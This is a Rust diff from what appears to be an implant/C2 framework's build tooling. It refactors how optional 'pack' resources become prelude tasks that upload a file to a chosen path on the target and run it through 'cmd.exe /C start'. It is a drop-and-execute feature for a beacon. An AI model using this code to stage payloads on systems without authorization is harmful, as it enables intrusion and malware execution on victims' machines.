@@ -59,7 +59,12 @@ pub fn update_beacon_toml(implant_config: &ImplantConfig) {
                 updated_features.push("runtime_tokio".to_string());
             }
         }
-        if implant_config.pack.len() > 0 || !implant_config.autorun.is_empty() {
+
+        let has_pack = implant_config
+            .pack
+            .as_ref()
+            .map_or(false, |p| !p.is_empty());
+        if has_pack || !implant_config.autorun.is_empty() {
             updated_features.push("malefic-prelude".to_string());
         }
 
@@ -93,51 +98,55 @@ pub fn update_malefic_spites(implant_config: &ImplantConfig, key: &str) -> anyho
     } else {
         Vec::new()
     };
-    for pack in &implant_config.pack {
-        if Path::new("./resources").join(&pack.src).exists() {
-            let upload_request =
-                Body::UploadRequest(malefic_proto::proto::modulepb::UploadRequest {
-                    name: "".to_string(),
-                    r#priv: 0o644,
-                    hidden: false,
-                    r#override: false,
-                    target: pack.dst.clone(),
-                    data: fs::read(Path::new("./resources").join(&pack.src))
-                        .expect("Failed to read resource file"),
-                });
-            spites.push(Spite {
-                name: "upload".to_string(),
-                task_id: 0,
-                r#async: false,
-                timeout: 0,
-                error: 0,
-                status: None,
-                body: Some(upload_request),
-            });
 
-            let exec_request = Body::ExecRequest(malefic_proto::proto::modulepb::ExecRequest {
-                path: "cmd.exe".to_string(),
-                ppid: 0,
-                args: vec![
-                    "/C".to_string(),
-                    "start".to_string(),
-                    "".to_string(),
-                    pack.dst.clone(),
-                ],
-                output: false,
-                singleton: true,
-            });
-            spites.push(Spite {
-                name: "exec".to_string(),
-                task_id: 0,
-                r#async: false,
-                timeout: 0,
-                error: 0,
-                status: None,
-                body: Some(exec_request),
-            });
+    if let Some(pack_resources) = &implant_config.pack {
+        for pack in pack_resources {
+            if Path::new("./resources").join(&pack.src).exists() {
+                let upload_request =
+                    Body::UploadRequest(malefic_proto::proto::modulepb::UploadRequest {
+                        name: "".to_string(),
+                        r#priv: 0o644,
+                        hidden: false,
+                        r#override: false,
+                        target: pack.dst.clone(),
+                        data: fs::read(Path::new("./resources").join(&pack.src))
+                            .expect("Failed to read resource file"),
+                    });
+                spites.push(Spite {
+                    name: "upload".to_string(),
+                    task_id: 0,
+                    r#async: false,
+                    timeout: 0,
+                    error: 0,
+                    status: None,
+                    body: Some(upload_request),
+                });
+
+                let exec_request = Body::ExecRequest(malefic_proto::proto::modulepb::ExecRequest {
+                    path: "cmd.exe".to_string(),
+                    ppid: 0,
+                    args: vec![
+                        "/C".to_string(),
+                        "start".to_string(),
+                        "".to_string(),
+                        pack.dst.clone(),
+                    ],
+                    output: false,
+                    singleton: true,
+                });
+                spites.push(Spite {
+                    name: "exec".to_string(),
+                    task_id: 0,
+                    r#async: false,
+                    timeout: 0,
+                    error: 0,
+                    status: None,
+                    body: Some(exec_request),
+                });
+            }
         }
     }
+
     update_prelude_spites(spites, "./resources", key, "spite.bin")?;
     log_success!("Malefic spites have been generated successfully");
     Ok(())
